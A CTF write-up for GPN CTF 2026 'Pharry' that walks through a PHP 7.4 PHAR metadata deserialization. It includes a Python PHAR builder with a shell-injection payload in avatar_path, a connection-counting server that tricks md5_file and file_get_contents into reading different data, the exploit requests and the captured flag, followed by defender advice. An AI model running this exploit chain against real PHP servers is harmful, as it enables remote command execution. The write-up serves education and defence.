---
title: "GPN CTF 2026 — Pharry: PHP 7.4 PHAR Deserialization via Two-Connection Race"
slug: "gpn-ctf-2026-pharry"
description: "GPN CTF Pharry writeup: a two-connection race makes md5_file() and file_get_contents() read different PHAR data."
date: 2026-06-07T19:30:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "gpn ctf 2026"
  - "pharry"
  - "php phar deserialization"
  - "php 7.4 phar"
  - "object injection"
  - "user destruct gadget"
  - "two connection race"
  - "md5_file file_get_contents"
  - "command injection"
series: ["GPN CTF 2026"]
keywords:
  - "gpn ctf pharry writeup"
  - "php 7.4 phar deserialization ctf"
  - "phar metadata unserialize"
  - "md5_file file_get_contents toctou"
  - "user destruct system rce"
  - "counting server phar exploit"
  - "phar:// stream wrapper rce"
toc: true
cover:
  image: "/images/articles/gpn-ctf-2026-pharry.png"
  alt: "Dark grid cover card for GPN CTF 2026 — Pharry, with large high-contrast title lettering."
---

{{< ctf-meta platform="GPN CTF 2026 (kitctf)" difficulty="Medium-Hard" os="Web — PHP 7.4, PHAR metadata unserialize, two-TCP-connection trick" skills="recognising md5_file and file_get_contents both open separate TCP connections to a URL, hosting a connection-counting HTTP server that returns different responses per attempt, crafting a PHAR with a User object metadata that fires system() in __destruct, triggering PHAR unserialize via md5_file(phar:///tmp/...) for RCE" >}}

**Pharry**, the **GPN CTF 2026** PHP challenge this **CyberSecurity Elite** writeup dissects, turns a `md5_file` + `file_get_contents` integrity-check pair into a PHAR deserialization. Both PHP functions open **separate TCP connections** to the URL they're given, so a counting server can serve one response to `md5_file` (close to make it return `FALSE`) and another to `file_get_contents` (return a PHAR). The PHAR ends up at `/tmp/remote_file.jpg`. A second request to `phar:///tmp/remote_file.jpg/a.txt` triggers PHP's metadata `unserialize()`, which fires `User::__destruct()` → `system("rm " . $avatar_path)` → RCE.

Flag:

```
GPNCTF{WeB_15_FOR_w33BS_4nd_5UCk5_pHP_IS_C00l_Tou6H}
```

This is the standalone deep-dive on `web/pharry` from the [GPN CTF 2026 master writeup](/ctf-writeups/gpn-ctf-2026-writeup/). Full source at [`web/pharry`](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master/web/pharry).

## Source

```php
<?php
class User {
    public $avatar_path;
    public $name;
    public $password;
    function __construct($name, $password) {
        $this->name = $name;
        $this->password = $password;
        $this->avatar_path = "avatars/".$name.".png";
        system("touch ".$this->avatar_path);          // command injection
    }
    function __destruct() {
        system("rm ".$this->avatar_path);             // command injection
    }
}

$file = $_GET['path'];
$res = md5_file($file);
if ($res == FALSE){
    file_put_contents("/tmp/remote_file.jpg", file_get_contents($file));
    $res = md5_file("/tmp/remote_file.jpg");
}
if ($res == 0xdeadbeef){
    echo "Congratulations! Here is not your flag: ".file_get_contents("flag.txt");
} else {
    echo $res;
}
```

The `0xdeadbeef` type-juggling branch is a decoy — the real flag is at `/flag`, not the `flag.txt` placeholder.

## The RCE gadget

`User::__destruct()` calls `system("rm " . $this->avatar_path)`. If we can deserialize a `User` object with a crafted `avatar_path` like `/tmp/x;cat /flag;#`, we get arbitrary command execution when the object is garbage-collected.

## The trigger — PHAR metadata `unserialize`

In PHP 7, opening a PHAR through a `phar://` path automatically deserializes its metadata. That includes a file operation such as `md5_file("phar:///path/to/archive.phar/internal-file")`. The deserialized objects persist until the request ends, when PHP calls their destructors — including `User::__destruct()`.

This behavior changed in **PHP 8.0**: merely opening a PHAR no longer deserializes its metadata. Metadata is deserialized when code explicitly calls `Phar::getMetadata()` or `PharFileInfo::getMetadata()`. Those calls can still be unsafe on untrusted archives unless deserialization is appropriately restricted. This challenge uses PHP 7.4, so its `md5_file("phar:///tmp/...")` trigger applies to the challenge runtime. See the [PHP Phar manual](https://www.php.net/manual/en/class.phar.php), [Phar::getMetadata() manual](https://www.php.net/manual/en/phar.getmetadata.php), and the [PHP RFC that introduced the change](https://wiki.php.net/rfc/phar_stop_autoloading_metadata).

## Why nested stream wrappers don't work

The obvious shortcuts both fail on PHP 7.4:

- **`phar://data://text/plain;base64,<B64>/a.txt`** — fails with `phar error: no directory in "phar://data://...", must have at least .../ for root directory`. PHP 7.4's PHAR extension requires the archive path to be a local filesystem path.
- **`phar://https://my-server/exploit.phar/a.txt`** — same restriction. Remote URLs blocked.

So we need to land the PHAR locally first. That's where the download gadget comes in.

## The two-connection trick

`md5_file($file)` and `file_get_contents($file)` are called sequentially in the same PHP request, but each opens its **own TCP connection**. A connection-counting server can serve different responses:

| Connection | Caller | Response | PHP behavior |
|---|---|---|---|
| #1 | `md5_file` | close immediately (no HTTP response) | "HTTP request failed!" → returns `FALSE` |
| #2 | `file_get_contents` | HTTP 200 + PHAR binary | returns PHAR bytes |

`file_put_contents("/tmp/remote_file.jpg", <PHAR bytes>)` then writes our payload to disk.

## Build the PHAR

```python
import struct, zlib, hashlib

cmd = "/tmp/x;cat /flag;#"
meta = f'O:4:"User":3:{{s:11:"avatar_path";s:{len(cmd)}:"{cmd}";s:4:"name";s:1:"x";s:8:"password";s:1:"x";}}'.encode()

stub   = b"<?php __HALT_COMPILER(); ?>\r\n"
fname  = b"a.txt"
fdata  = b"a"
fcrc32 = zlib.crc32(fdata) & 0xFFFFFFFF

file_entry = (
    struct.pack("<I", len(fname)) + fname +
    struct.pack("<I", len(fdata)) + struct.pack("<I", 0) +
    struct.pack("<I", len(fdata)) + struct.pack("<I", fcrc32) +
    struct.pack("<I", 0) + struct.pack("<I", 0)
)
manifest_body = (
    struct.pack("<I", 1) + struct.pack("<H", 0x0011) +
    struct.pack("<I", 0x00010000) + struct.pack("<I", 0) +
    struct.pack("<I", len(meta)) + meta + file_entry
)
manifest = struct.pack("<I", len(manifest_body)) + manifest_body
phar_body = stub + manifest + fdata
sig = hashlib.sha1(phar_body).digest()
phar = phar_body + sig + struct.pack("<I", 0x0002) + b"GBMB"

with open("exploit.phar", "wb") as f:
    f.write(phar)
```

The `User` metadata serializes a properties dict where `avatar_path` is the command injection. PHP 7.4's `unserialize` reconstructs the object including the malicious property — but the `__construct` is *not* called (deserialization skips constructors), so `__destruct` runs with our property values intact.

## The counting server

```python
counter = {}

def handle(conn, addr):
    try:
        data = conn.recv(4096)
        path = data.split(b"\r\n")[0].split(b" ")[1].decode()
        counter[path] = counter.get(path, 0) + 1
        n = counter[path]
        if n == 1:
            conn.close()                          # empty → md5_file returns FALSE
        else:
            phar = open("exploit.phar", "rb").read()
            resp = (b"HTTP/1.0 200 OK\r\nContent-Length: "
                    + str(len(phar)).encode() + b"\r\n\r\n" + phar)
            conn.sendall(resp)
            conn.close()
    except:
        try: conn.close()
        except: pass
```

Expose port 8877 publicly via `ssh -R 80:localhost:8877 nokey@localhost.run` (or equivalent).

## Two-request exploitation

```
GET /?path=https://<tunnel>/exploit.phar
```

Connection #1 → `md5_file` → closed → `FALSE` → enters download branch.
Connection #2 → `file_get_contents` → PHAR → written to `/tmp/remote_file.jpg`.

```
GET /?path=phar:///tmp/remote_file.jpg/a.txt
```

`md5_file("phar:///tmp/remote_file.jpg/a.txt")` opens the PHAR, `unserialize()`s the metadata, creates the `User` object. At request shutdown, PHP GCs the object → `__destruct` → `system("rm /tmp/x;cat /flag;#")` → flag in the response body.

```
$ python3 exploit.py --target https://...gpn24.ctf.kitctf.de --tunnel-host your.tunnel.host
[*] Generated PHAR (234 bytes), avatar_path="/tmp/x;cat /flag;#"
[*] Trick server listening on :8877
[+] PHAR uploaded — /tmp/remote_file.jpg MD5: cf58e772474c5627c13f974b07142049
[+] RCE output:
GPNCTF{WeB_15_FOR_w33BS_4nd_5UCk5_pHP_IS_C00l_Tou6H}
```

## Defender takeaway

- **PHAR metadata auto-deserialization is the primitive in this PHP 7.4 challenge.** PHP 7.x automatically deserializes PHAR metadata when opening an archive. Starting with PHP 8.0, opening an archive alone no longer does so; explicit `getMetadata()` calls still deserialize metadata and must be treated carefully. Upgrade to a currently supported PHP release, avoid calling metadata accessors on untrusted archives, and allow-list the schemes and paths accepted from users. The [PHP Phar documentation](https://www.php.net/manual/en/class.phar.php) describes the version change.
- **`md5_file` and `file_get_contents` opening separate TCP connections is a TOCTOU primitive.** Any integrity check that fetches the URL twice is vulnerable to a counting server. The fix is to fetch *once*, hash the buffer, and use the same buffer for the work — not "hash via URL, then read via URL."
- **`User` classes with `__destruct` that runs `system`/`exec` are a deserialization gadget chain waiting to happen.** Move side-effecting code out of `__destruct`; if you must keep it, validate the inputs at construction and treat any `unserialize`-touched object as untrusted.
- **Command injection in PHP `system` calls** is the second-tier vulnerability beneath the deserialization. Even if PHAR unserialize were fixed, `$avatar_path = "avatars/".$name.".png"` is shell-injectable via `name=foo;ls`. Use `escapeshellarg()` or pass arguments as an array via `proc_open`.

## Frequently asked questions

### What's the PHAR metadata deserialization bug?

In PHP 7.x, opening a PHAR through a `phar://` operation such as `md5_file`, `file_get_contents`, `fopen`, or `file_exists` automatically deserializes its metadata. Starting with PHP 8.0, opening the archive alone no longer deserializes metadata; calling `Phar::getMetadata()` or `PharFileInfo::getMetadata()` does. On PHP 7.x, a PHAR containing a `User` object can therefore trigger its destructor when the archive is opened, if the application has the relevant gadget. On PHP 8.0 and later, the explicit metadata access call is the deserialization point. See the [PHP Phar manual](https://www.php.net/manual/en/class.phar.php).

### Why does the two-connection trick work?

`md5_file($file)` and `file_get_contents($file)` each open a separate TCP connection to the URL. A counting HTTP server serves different responses per connection: close the first (so `md5_file` returns `FALSE`), then serve the PHAR on the second (so `file_get_contents` returns PHAR bytes). `file_put_contents` writes the PHAR to `/tmp/remote_file.jpg`, and a follow-up `phar://` access triggers deserialization.

### Why doesn't `phar://data://` work on PHP 7.4?

PHP 7.4's PHAR extension requires the archive path to be a local filesystem path. Nested stream wrappers (`data://`, `https://`, `php://filter/...`) are rejected with `phar error: no directory in "phar://data://..."`. The bug was relaxed in some PHP 7.x builds and re-tightened in 7.4. So we have to land the PHAR locally first.

### How does the `User` destructor chain fire?

The PHAR's metadata is a serialized `User` object with `avatar_path = "/tmp/x;cat /flag;#"`. `unserialize` reconstructs the object — `__construct` is **not** called on deserialization, so the constructor's `touch` doesn't run. At request end, PHP GCs the object and calls `__destruct`, which executes `system("rm /tmp/x;cat /flag;#")` — the `;` chains `cat /flag` after the `rm`, and `#` comments out the trailing `.png` from the original code.

### What's the `0xdeadbeef` branch for?

A decoy. The condition `$res == 0xdeadbeef` (integer `3735928559`) is a nod to PHP's loose-comparison type juggling — an MD5 hash that starts with the decimal digits `3735928559` would satisfy it. But the supposed reward is `flag.txt`, which contains an ASCII-art decoy. The real flag is at `/flag` (no extension), reached only via the PHAR deserialization path.

### How would you fix the server?

Use a currently supported PHP release and preserve the PHP 8.0 behavior change in your threat model: opening a PHAR no longer automatically deserializes metadata, but explicit `getMetadata()` calls still do. Do not call those accessors on untrusted archives unless deserialization is safely restricted. For user-controlled paths, allow-list the schemes and filesystem locations the application needs instead of trying to infer safety from a string check. Separately, fetch remote content once, then hash and process that same buffer; do not make integrity decisions from one URL fetch and use a second fetch as the content.

### Where can I find the solver?

Full source at [`web/pharry`](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master/web/pharry) including the PHAR generator, counting server, and end-to-end exploit. Master writeup at [/ctf-writeups/gpn-ctf-2026-writeup/](/ctf-writeups/gpn-ctf-2026-writeup/).

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What's the PHAR metadata deserialization bug?","acceptedAnswer": {"@type": "Answer","text": "In PHP 7.x, opening a PHAR through a phar:// operation automatically deserializes metadata. Starting with PHP 8.0, opening the archive alone no longer deserializes metadata; Phar::getMetadata() or PharFileInfo::getMetadata() does. A gadget in a PHP 7.x application can therefore run when the archive is opened, while in PHP 8.0 and later the explicit metadata accessor is the deserialization point."}},
    {"@type": "Question","name": "Why does the two-connection trick work?","acceptedAnswer": {"@type": "Answer","text": "md5_file and file_get_contents each open a separate TCP connection to the URL. A counting HTTP server serves different responses per connection: close the first so md5_file returns FALSE, serve the PHAR on the second so file_get_contents returns bytes. file_put_contents writes the PHAR to /tmp/remote_file.jpg; a follow-up phar:// access triggers deserialization."}},
    {"@type": "Question","name": "Why doesn't phar://data:// work on PHP 7.4?","acceptedAnswer": {"@type": "Answer","text": "PHP 7.4's PHAR extension requires the archive path to be a local filesystem path. Nested stream wrappers (data://, https://, php://filter/...) are rejected. We have to land the PHAR locally first."}},
    {"@type": "Question","name": "How does the User destructor chain fire?","acceptedAnswer": {"@type": "Answer","text": "The PHAR metadata is a serialized User object with avatar_path = /tmp/x;cat /flag;#. unserialize reconstructs the object; __construct is NOT called on deserialization. At request end PHP GCs the object and __destruct runs system(rm /tmp/x;cat /flag;#) — the ; chains cat /flag after rm, # comments out the trailing .png."}},
    {"@type": "Question","name": "What's the 0xdeadbeef branch for?","acceptedAnswer": {"@type": "Answer","text": "A decoy. The condition $res == 0xdeadbeef is a nod to PHP's loose-comparison type juggling. The reward flag.txt contains an ASCII-art decoy. The real flag is at /flag (no extension), reached only via the PHAR deserialization path."}},
    {"@type": "Question","name": "How would you fix the server?","acceptedAnswer": {"@type": "Answer","text": "Use a currently supported PHP release. Since PHP 8.0, opening a PHAR alone no longer automatically deserializes metadata, but explicit getMetadata() calls still do and must be treated carefully. Allow-list accepted schemes and paths, avoid metadata access on untrusted archives unless deserialization is restricted, and fetch remote content once so the hash and processing use the same bytes."}},
    {"@type": "Question","name": "Where can I find the solver code?","acceptedAnswer": {"@type": "Answer","text": "Full source at web/pharry in github.com/Abdelkad3r/gpn-ctf-2026 including the PHAR generator, counting server, and end-to-end exploit. Master writeup at cybersecurityelite.com/ctf-writeups/gpn-ctf-2026-writeup/."}}
  ]
}
</script>
